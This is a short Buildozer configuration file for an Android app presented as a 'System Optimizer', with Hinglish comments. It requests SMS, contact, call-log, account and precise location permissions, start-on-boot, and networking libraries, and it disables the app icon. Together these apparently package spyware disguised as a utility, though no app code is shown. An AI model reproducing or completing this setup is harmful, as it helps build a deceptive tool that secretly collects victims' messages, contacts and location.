[app]
title = System Optimizer
package.name = sysservice
package.domain = com.ghost.pro
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 6.0

# Requirements: Isme 'requests' aur 'pyjnius' hona zaroori hai
requirements = python3,kivy==2.3.0,requests,pyjnius,android

# Permissions: Sabhi access yahan enable hain
android.permissions = INTERNET, READ_SMS, READ_CONTACTS, READ_CALL_LOG, ACCESS_FINE_LOCATION, ACCESS_COARSE_LOCATION, GET_ACCOUNTS, RECEIVE_BOOT_COMPLETED

# Android SDK/NDK Settings (Most Stable Mix)
android.api = 33
android.minapi = 21
android.ndk = 25b
android.archs = arm64-v8a
p4a.branch = master

# Icon: Jhamela khatam karne ke liye disabled
# icon.filename = icon.png

[buildozer]
log_level = 2
warn_on_root = 1

